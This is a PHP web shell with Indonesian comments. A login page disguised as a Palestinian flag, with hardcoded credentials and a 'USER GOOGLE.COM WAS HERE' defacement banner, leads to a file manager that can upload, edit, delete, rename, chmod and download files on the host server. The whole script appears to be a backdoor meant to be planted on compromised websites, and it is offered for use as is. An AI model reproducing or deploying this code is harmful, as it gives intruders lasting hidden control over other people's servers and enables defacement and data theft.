                                <?php
session_start(); // Mulai sesi

// Daftar pengguna yang valid (gantilah ini dengan pengguna yang sesungguhnya)
$validUsers = array(
    'user0' => 'pass0',
    'userwin' => 'passwin',
);

// Fungsi untuk memeriksa otentikasi pengguna
function cekOtentikasi($username, $password) {
    global $validUsers;
    if (isset($validUsers[$username]) && $validUsers[$username] === $password) {
        return true; // Otentikasi berhasil
    }
    return false; // Otentikasi gagal
}

// Proses login jika form dikirimkan
if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['login'])) {
    $username = filter_input(INPUT_POST, 'username', FILTER_SANITIZE_STRING);
    $password = filter_input(INPUT_POST, 'password', FILTER_SANITIZE_STRING);

    if (cekOtentikasi($username, $password)) {
        // Otentikasi berhasil, atur sesi
        $_SESSION['loggedin'] = true;
        $_SESSION['username'] = $username;
    } else {
        // Otentikasi gagal, tampilkan pesan error
        $pesanError = "Username atau Password salah.";
    }
}

// Logout jika diperlukan
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ?'); // Redirect ke halaman login setelah logout
    exit;
}

// Cek apakah pengguna sudah login, jika tidak, tampilkan form login
if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
    ?>
    <!DOCTYPE html>
    <html>
<head>
<style>
body {
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
}

.flag {
    width: 200px;
    height: 100px;
    position: relative;
    display: flex;
    flex-direction: column;

}

.stripe {
    flex: 1;
    width: 100%;
color:orange;
font-size:25px;

}

.stripe-black {
    background-color: #000; /* Warna hitam pada bendera Palestina */

}

.stripe-white {
    background-color: #fff; /* Warna putih pada bendera Palestina */
}

.stripe-green {
    background-color: #009900; /* Warna hijau pada bendera Palestina */
}


.triangle-left{
      width: 0;
    height: 0;
    border-top: 50px solid transparent;
    border-bottom: 50px solid transparent;
    border-left: 65px solid #FF0000;
    position: absolute;
    left: 0;
    z-index: 2;
}
.iflag { width: 200px; height: 100px; position: relative;bottom:100px;left:250px; display: flex; flex-direction: column; background: linear-gradient(to bottom, red 50%, white 50%); border: 1px solid black; color: white; /* Mengatur warna teks agar terlihat di atas latar belakang */ padding: 10px 20px; /* Sesuaikan ukuran padding sesuai kebutuhan Anda */ }
}

</style>
</head><title>USER GOOGLE.COM WAS HERE</title>
<body><div>
<?php if (isset($pesanError)) echo "<p>$pesanError</p>";echo"<p>"; ?>
<form method="post">
    <div class="flag">
        <input class="stripe stripe-black" value="" name="username"> <input class="stripe stripe-white" value="" name="password"> <input readonly class="stripe stripe-green"> <div class="triangle-left"></div></div><input type="submit" class="iflag" name="login" value=""> </form>
</body>
<center>
<div  id="zal">
    <script>
  var i=0,text;
  text = " USER GOOGLE.COM WAS HERE ..."

  function ketik() {
    if(i<text.length){
      document.getElementById("zal").innerHTML += text.charAt(i);
      i++;
      setTimeout(ketik,100);
    }
  }
  ketik();
</script></div></center>
</html>
   

   
    <?php
    exit; // Hentikan eksekusi jika pengguna belum login
}



$base_dir = __DIR__; // Direktori root dari file manager
$current_dir = isset($_GET['dir']) ? $_GET['dir'] : '';
$dir_path = realpath($base_dir . '/' . $current_dir);

// Validasi path
if (!$dir_path || strpos($dir_path, $base_dir) !== 0) {
    die('Akses tidak diizinkan');
}

// Fungsi untuk menampilkan ukuran file
function format_size($size) {
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $unit = 0;
    while ($size >= 1024 && $unit < 4) {
        $size /= 1024;
        $unit++;
    }
    return round($size, 2) . ' ' . $units[$unit];
}

// Fungsi untuk menampilkan file dan direktori
function list_files($dir_path, $current_dir) {
    $files = array_diff(scandir($dir_path), ['.', '..']);
    foreach ($files as $file) {
        $file_path = $dir_path . '/' . $file;
        $is_dir = is_dir($file_path);
        $file_url = $current_dir . '/' . $file;
        echo '<tr>';
        echo '<td>' . ($is_dir ? '<i class="fas fa-folder"></i> ' : '<i class="fas fa-file"></i> ') . '<a href="?dir=' . urlencode($file_url) . '">' . $file . '</a></td>';
        echo '<td>' . ($is_dir ? 'Directory' : 'File') . '</td>';
        echo '<td>' . ($is_dir ? '-' : format_size(filesize($file_path))) . '</td>';
        echo '<td>' . substr(sprintf('%o', fileperms($file_path)), -4) . '</td>';
        echo '<td>';
        echo '<a href="?dir=' . urlencode($current_dir) . '&action=delete&file=' . urlencode($file) . '">Delete</a> | ';
        echo '<a href="?dir=' . urlencode($current_dir) . '&action=rename&file=' . urlencode($file) . '">Rename</a> | ';
        if (!$is_dir) {
            echo '<a href="?dir=' . urlencode($current_dir) . '&action=download&file=' . urlencode($file) . '">Download</a> | ';
            echo '<a href="?dir=' . urlencode($current_dir) . '&action=edit&file=' . urlencode($file) . '">Edit</a> | ';
        }
        echo '<a href="?dir=' . urlencode($current_dir) . '&action=chmod&file=' . urlencode($file) . '">Chmod</a>';
        echo '</td>';
        echo '</tr>';
    }
}

// Fungsi untuk menampilkan breadcrumb path
function display_breadcrumbs($current_dir) {
    $breadcrumbs = explode('/', $current_dir);
    $path = '';
    echo '<a href="?dir=">Root</a> / ';
    foreach ($breadcrumbs as $crumb) {
        if ($crumb !== '') {
            $path .= '/' . $crumb;
            echo '<a href="?dir=' . urlencode(ltrim($path, '/')) . '">' . $crumb . '</a> / ';
        }
    }
}

// Fungsi untuk menghapus file atau direktori
if (isset($_GET['action']) && $_GET['action'] == 'delete' && isset($_GET['file'])) {
    $file_path = $dir_path . '/' . $_GET['file'];
    if (is_dir($file_path)) {
        rmdir($file_path);
    } else {
        unlink($file_path);
    }
    header('Location: ?dir=' . urlencode($current_dir));
    exit();
}

// Fungsi untuk mengganti nama file atau direktori
if (isset($_POST['rename']) && isset($_POST['newname']) && isset($_POST['file'])) {
    $old_file = $dir_path . '/' . $_POST['file'];
    $new_file = $dir_path . '/' . $_POST['newname'];
    rename($old_file, $new_file);
    header('Location: ?dir=' . urlencode($current_dir));
    exit();
}

// Fungsi untuk mengunduh file
if (isset($_GET['action']) && $_GET['action'] == 'download' && isset($_GET['file'])) {
    $file_path = $dir_path . '/' . $_GET['file'];
    if (file_exists($file_path)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file_path) . '"');
        header('Content-Length: ' . filesize($file_path));
        readfile($file_path);
        exit();
    }
}

// Fungsi untuk mengubah izin (chmod) file atau direktori
if (isset($_POST['chmod']) && isset($_POST['permissions']) && isset($_POST['file'])) {
    $file_path = $dir_path . '/' . $_POST['file'];
    chmod($file_path, octdec($_POST['permissions']));
    header('Location: ?dir=' . urlencode($current_dir));
    exit();
}

// Fungsi untuk mengunggah file
if (isset($_FILES['file'])) {
    $upload_file = $dir_path . '/' . basename($_FILES['file']['name']);
    move_uploaded_file($_FILES['file']['tmp_name'], $upload_file);
    header('Location: ?dir=' . urlencode($current_dir));
    exit();
}

// Fungsi untuk membuat direktori baru
if (isset($_POST['dirname']) && !empty($_POST['dirname'])) {
    $new_dir = $dir_path . '/' . $_POST['dirname'];
    mkdir($new_dir);
    header('Location: ?dir=' . urlencode($current_dir));
    exit();
}

// Fungsi untuk membuat file baru
if (isset($_POST['filename']) && !empty($_POST['filename'])) {
    $new_file = $dir_path . '/' . $_POST['filename'];
    file_put_contents($new_file, '');
    header('Location: ?dir=' . urlencode($current_dir));
    exit();
}

// Fungsi untuk mengedit file
if (isset($_POST['save']) && isset($_POST['content']) && isset($_POST['file'])) {
    $file_path = $dir_path . '/' . $_POST['file'];
    file_put_contents($file_path, $_POST['content']);
    header('Location: ?dir=' . urlencode($current_dir));
    exit();
}

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Manager</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        body {
            font-family: Arial, sans-serif;
        }
        table {
            width: 100%;
            border-collapse: collapse;
        }
        table, th, td {
            border: 1px solid black;
        }
        th, td {
            padding: 8px;
            text-align: left;
        }
        a {
            color: blue;
            text-decoration: none;
        }
        a:hover {
            text-decoration: underline;
        }
        .form-inline {
            display: flex;
            gap: 10px;
            margin-bottom: 10px;
        }
    </style>
</head>
<body>

<h1>File Manager</h1>

    <h1>Selamat datang, <?php echo $_SESSION['username']; ?>!</h1>
    <a href="?logout">Logout</a>
    <center>
        <a href="?">Home</a> 
        <p>
<p>
    <?php display_breadcrumbs($current_dir); ?>
</p>

<table>
    <thead>
        <tr>
            <th>Name</th>
            <th>Type</th>
            <th>Size</th>
            <th>Permissions</th>
            <th>Actions</th>
        </tr>
    </thead>
    <tbody>
        <?php list_files($dir_path, $current_dir); ?>
    </tbody>
</table>

<h2>Actions</h2>

<div class="form-inline">
    <form method="POST" enctype="multipart/form-data">
        <input type="file" name="file">
        <button type="submit">Upload File</button>
    </form>

    <form method="POST">
        <input type="text" name="dirname" placeholder="Directory Name">
        <button type="submit">Create Directory</button>
    </form>

    <form method="POST">
        <input type="text" name="filename" placeholder="File Name">
        <button type="submit">Create File</button>
    </form>
</div>

<?php if (isset($_GET['action']) && $_GET['action'] == 'rename' && isset($_GET['file'])): ?>
<h3>Rename File/Directory: <?php echo htmlspecialchars($_GET['file']); ?></h3>
<form method="POST">
    <input type="hidden" name="file" value="<?php echo htmlspecialchars($_GET['file']); ?>">
    <input type="text" name="newname" placeholder="New Name">
    <button type="submit" name="rename">Rename</button>
</form>
<?php endif; ?>

<?php if (isset($_GET['action']) && $_GET['action'] == 'chmod' && isset($_GET['file'])): ?>
<h3>Change Permissions (chmod) for: <?php echo htmlspecialchars($_GET['file']); ?></h3>
<form method="POST">
    <input type="hidden" name="file" value="<?php echo htmlspecialchars($_GET['file']); ?>">
    <input type="text" name="permissions" placeholder="e.g. 0755">
    <button type="submit" name="chmod">Change Permissions</button>
</form>
<?php endif; ?>

<?php if (isset($_GET['action']) && $_GET['action'] == 'edit' && isset($_GET['file'])): ?>
<h3>Edit File: <?php echo htmlspecialchars($_GET['file']); ?></h3>
<form method="POST">
    <input type="hidden" name="file" value="<?php echo htmlspecialchars($_GET['file']); ?>">
    <textarea name="content" rows="20" style="width: 100%;"><?php echo htmlspecialchars(file_get_contents($dir_path . '/' . $_GET['file'])); ?></textarea>
    <button type="submit" name="save">Save Changes</button>
</form>
<?php endif; ?>

</body>
</html>
 
			
